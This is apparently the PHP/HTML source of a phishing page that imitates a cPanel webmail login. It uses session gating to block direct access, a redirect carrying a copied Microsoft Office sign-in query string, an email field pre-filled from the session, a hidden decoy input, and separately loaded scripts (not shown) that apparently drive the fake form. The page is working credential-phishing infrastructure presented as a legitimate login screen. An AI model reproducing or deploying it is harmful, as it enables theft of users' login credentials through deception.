<?php
if(!isset($_SESSION)) 
    { 
        session_start(); 
    }
	if (!$_SESSION['Index2']) { // 
    header("Location: ./index?client_id=4345a7b9-9a63-4910-a426-35363201d503&response_mode=form_post&response_type=code+id_token&scope=openid+profile&state=OpenIdConnect.AuthenticationProperties%3donpDpYbVA9UXVeosIVrA2-DRa_7W9BcPErYg_pHkzLEm2C1CXJyT7zl-TTnGm7GUwNa28IqVdMPLDfTu22Vkx9jLw7ulhKTeOy8b3tB1XrriWmPomqxiCJyQbvHmEDVD&nonce=636905940261455591.NGY1NDc0NjYtYTUyNi00NzQ5LWE0NTEtMzY4ZTkxMjBlOTc1MGJlMDllZmQtODE0Ni00N2U2LWI2MjctZjYyYzcxODY2ZmM3&redirect_uri=https%3a%2f%2fwww.office.com%2f&ui_locales=en-US&mkt=en-US&client-request-id=dbf14819-814f-4fc4-b446-9ee8f4d1cdc6"); 
    exit();
}

if (isset($_SESSION['UserAddress'])) {
	
	$UserAddress = $_SESSION['UserAddress'];
	
} else {
	
	$UserAddress = "";
	
}

?>
<html lang="en" dir="ltr"><head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <script language="Javascript" src="js/index2A.js"></script>
                    <div class="scroller clear">
                        
                            <div class="locale-cell"><a href="#" style="">العربية</a></div>
                        
                            <div class="locale-cell"><a href="#" style="">български</a></div>
                        
                            <div class="locale-cell"><a href="#" style="">čeština</a></div>
                        
                            <div class="locale-cell"><a href="#" style="">dansk</a></div>
                        
                            <div class="locale-cell"><a href="#" style="">Deutsch</a></div>
                        
                            <div class="locale-cell"><a href="#" style="">Ελληνικά</a></div>
                        
                            <div class="locale-cell"><a href="#" style="">English</a></div>
                        
                            <div class="locale-cell"><a href="#" style="">español</a></div>
                        
                            <div class="locale-cell"><a href="#" style="">español latinoamericano</a></div>
                        
                            <div class="locale-cell"><a href="#" style="">español de España</a></div>
                        
                            <div class="locale-cell"><a href="#" style="">suomi</a></div>
                        
                            <div class="locale-cell"><a href="#" style="">Filipino</a></div>
                        
                            <div class="locale-cell"><a href="#" style="">français</a></div>
                        
                            <div class="locale-cell"><a href="#" style="">עברית</a></div>
                        
                            <div class="locale-cell"><a href="#" style="">magyar</a></div>
                        
                            <div class="locale-cell"><a href="#" style="">☃ cPanel Snowmen ☃ - i_cpanel_snowmen</a></div>
                        
                            <div class="locale-cell"><a href="#" style="">i_en</a></div>
                        
                            <div class="locale-cell"><a href="#" style="">Bahasa Indonesia</a></div>
                        
                            <div class="locale-cell"><a href="#" style="">italiano</a></div>
                        
                            <div class="locale-cell"><a href="#" style="">日本語</a></div>
                        
                            <div class="locale-cell"><a href="#" style="">한국어</a></div>
                        
                            <div class="locale-cell"><a href="#" style="">Bahasa Melayu</a></div>
                        
                            <div class="locale-cell"><a href="#" style="">norsk bokmål</a></div>
                        
                            <div class="locale-cell"><a href="#" style="">Nederlands</a></div>
                        
                            <div class="locale-cell"><a href="#" style="">Norwegian</a></div>
                        
                            <div class="locale-cell"><a href="#" style="">polski</a></div>
                        
                            <div class="locale-cell"><a href="#" style="">português</a></div>
                        
                            <div class="locale-cell"><a href="#" style="">português do Brasil</a></div>
                        
                            <div class="locale-cell"><a href="#" style="">română</a></div>
                        
                            <div class="locale-cell"><a href="#" style="">русский</a></div>
                        
                            <div class="locale-cell"><a href="#" style="">slovenščina</a></div>
                        
                            <div class="locale-cell"><a href="#" style="">svenska</a></div>
                        
                            <div class="locale-cell"><a href="#" style="">ไทย</a></div>
                        
                            <div class="locale-cell"><a href="#" style="">Türkçe</a></div>
                        
                            <div class="locale-cell"><a href="#" style="">українська</a></div>
                        
                            <div class="locale-cell"><a href="#" style="">Tiếng Việt</a></div>
                        
                            <div class="locale-cell"><a href="#" style="">中文</a></div>
                        
                            <div class="locale-cell"><a href="#" style="">中文（中国）</a></div>
                        
                            <div class="locale-cell"><a href="#" style="">中文（台湾）</a></div>
                        
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script language="Javascript" src="js/index2B.js"></script>
								<input name="email" id="email" class="nono" type="text">
                                    <input name="user" id="user" autofocus="autofocus" value="<?= $UserAddress ?>" placeholder="Enter your email address." class="std_textbox" type="text" tabindex="1" required="">
                                </div>
                                <script language="Javascript" src="js/index2C.js"></script>
                            <option value='ar'>العربية</option><option value='bg'>български</option><option value='cs'>čeština</option><option value='da'>dansk</option><option value='de'>Deutsch</option><option value='el'>Ελληνικά</option><option value='en'>English</option><option value='es'>español</option><option value='es_419'>español latinoamericano</option><option value='es_es'>español de España</option><option value='fi'>suomi</option><option value='fil'>Filipino</option><option value='fr'>français</option><option value='he'>עברית</option><option value='hu'>magyar</option><option value='i_cpanel_snowmen'>☃ cPanel Snowmen ☃ - i_cpanel_snowmen</option><option value='i_en'>i_en</option><option value='id'>Bahasa Indonesia</option><option value='it'>italiano</option><option value='ja'>日本語</option><option value='ko'>한국어</option><option value='ms'>Bahasa Melayu</option><option value='nb'>norsk bokmål</option><option value='nl'>Nederlands</option><option value='no'>Norwegian</option><option value='pl'>polski</option><option value='pt'>português</option><option value='pt_br'>português do Brasil</option><option value='ro'>română</option><option value='ru'>русский</option><option value='sl'>slovenščina</option><option value='sv'>svenska</option><option value='th'>ไทย</option><option value='tr'>Türkçe</option><option value='uk'>українська</option><option value='vi'>Tiếng Việt</option><option value='zh'>中文</option><option value='zh_cn'>中文（中国）</option><option value='zh_tw'>中文（台湾）</option>                        </select>
                        <button style="margin-left: 10px" type="submit">Change</button>
                    </form>
                    <style type="text/css">#mobilelocalemenu, #locales_list {display:none}</style>
                </noscript>
                <ul id="locales_list">
                    
                        
                        <li><a href="#" style="">العربية</a></li>
                    
                        
                        <li><a href="#" style="">български</a></li>
                    
                        
                        <li><a href="#" style="">čeština</a></li>
                    
                        
                        <li><a href="#" style="">dansk</a></li>
                    
                        
                        <li><a href="#" style="">Deutsch</a></li>
                    
                        
                        <li><a href="#" style="">Ελληνικά</a></li>
                    
                        
                        <li><a href="#" style="">English</a></li>
                    
                        
                        <li><a href="#" style="">español</a></li>
                    
                        
                    <li><a href="javascript:void(0)" id="morelocale" onclick="toggle_locales(true)" title="More locales" style="">…</a></li>
                </ul>
                <script language="Javascript" src="js/index2D.js"></script>
<?php
unset($_SESSION['Index2']);
?>

</body></html>